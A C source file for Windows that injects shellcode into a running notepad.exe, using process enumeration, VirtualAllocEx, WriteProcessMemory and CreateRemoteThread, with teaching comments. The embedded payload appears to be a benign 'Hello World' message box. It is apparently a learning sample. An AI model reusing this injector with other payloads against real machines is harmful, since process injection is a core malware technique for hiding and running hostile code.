#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

#define IS_HANDLE_INVALID(x) (x==NULL || x==INVALID_HANDLE_VALUE)
#define TARGET "notepad.exe"

// "Hello World" MessageBox shellcode
unsigned char payload[] = 
    "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
    "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
    "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
    "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
    "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
    "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
    "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
    "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
    "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
    "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
    "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
    "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
    "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
    "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
    "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
    "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
    "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
    "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
    "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
    "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
    "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
    "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
    "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
    "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
    "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
    "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
    "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
    "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
    "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

size_t payload_len = sizeof(payload);

// Find PID from a Process Name
DWORD find_pid(const char* procname) {
    DWORD pid = 0;
    PROCESSENTRY32 pe32;
    
    // Take Snapshot of all processes on the system
    // See: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
    HANDLE hProcSnap = CreateToolhelp32Snapshot(
        TH32CS_SNAPPROCESS, //  Take a snapshot of the processes
        0                   //  Capture a snapshot of all processes in the system
    );

    // Check if handle is valid
    if (IS_HANDLE_INVALID(hProcSnap)) {
        fprintf(stderr, "[!] CreateToolhelp32Snapshot() failed (0x%x)\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);   // Store size of strcut

    // Retrieves information about the first 
    // process encountered in a system snapshot.
    // See: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
    BOOL result = Process32First(hProcSnap, &pe32);

    if (!result) {
        fprintf(stderr, "[!] Process32First() failed (0x%x)\n", GetLastError());
        CloseHandle(hProcSnap);
        return 0;
    }

    // Loop through Snapshot entries
    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    CloseHandle(hProcSnap);
    return pid;
}

// Inject payload into process
int inject_shellcode(DWORD pid) {
    DWORD bWritten = 0;

    // Opens an existing local process object.
    // See: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, // Process Access Rights
        FALSE, // Do not inherit handle     
        pid    // PID of process to open
    );

    if (IS_HANDLE_INVALID(hProc)) {
        fprintf(stderr, "[!] OpenProcess() failed (0x%x)\n", GetLastError());
        return -1;
    }

    // Reserves, commits, or changes the state of a 
    // region of memory within the virtual address space of a specified process. 
    LPVOID pRemoteCode = VirtualAllocEx(
        hProc,                                // Handle to process to allocate memory to
        NULL,                                 // No desired starting address
        payload_len,                          // Size of memory to allocate
        MEM_RESERVE | MEM_COMMIT,             // Make the specified memory range available for use by the process
        PAGE_EXECUTE_READ                     // R+X 
    );
        
    if (NULL == pRemoteCode) {
        fprintf(stderr, "[!] VirtualAllocEx() failed (0x%x)\n", GetLastError());
        CloseHandle(hProc);
        return -1;
    }

    // Writes data to an area of memory in a specified process.
    // See: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    BOOL result = WriteProcessMemory(
        hProc,                  // Handle to the process memory to be modified.
        pRemoteCode,            // Pointer to the base address in the specified process to which data is written
        (PVOID)payload,         // Pointer to the buffer that contains data to be written
        (SIZE_T)payload_len,    // The number of bytes to be written
        (SIZE_T *)&bWritten
    );

    // Check if the whole payload was written into the 
    // target process's virtual memory
    if (bWritten != payload_len) {
        fprintf(stderr, "[!] WriteProcessMemory() failed to write complete payload (0x%x)\n", GetLastError());
        CloseHandle(hProc);
        return -1;
    }
        
    if (!result) {
        fprintf(stderr, "[!] WriteProcessMemory() failed (0x%x)\n", GetLastError());
        CloseHandle(hProc);
        return -1;
    }

    // Creates a thread that runs in the virtual address space of another process.
    // See: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
    HANDLE hThread = CreateRemoteThread(
        hProc,              // Handle to process
        NULL,               // Thread gets a default security descriptor and the handle cannot be inherited
        0,                  // Use default stack size
        pRemoteCode,        // Pointer to memory where payload is written
        NULL,               // No variables to be passed to the thread function
        0,                  // The thread runs immediately after creation
        NULL                // The thread identifier is not returned
    );

    if (IS_HANDLE_INVALID(hThread)) {
        fprintf(stderr, "[!] CreateRemoteThread() failed (0x%x)\n", GetLastError());
        CloseHandle(hProc);
        return -1;
    }

    // Wait for thread to finish execution
    int _result = WaitForSingleObject(hThread, -1);
    if (_result == WAIT_FAILED) {
        fprintf(stderr, "[!] WaitForSingleObject() failed (0x%x)\n", GetLastError());
        CloseHandle(hThread);        
        CloseHandle(hProc);
        return -1;
    } 
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}

int main(void) {
    DWORD pid = find_pid(TARGET);
    
    if (pid == 0) {
        fprintf(stderr, "[!] No %s found\n", TARGET);
        return -1;
    }

    printf("[i] %s: %d\n", TARGET, pid);

    int result = inject_shellcode(pid);
    if (result < 0) {
        fprintf(stderr, "[!] Failed to inject payload\n");
        return -2;
    }
    printf("[i] Injection Complete!\n");
    return 0;
}
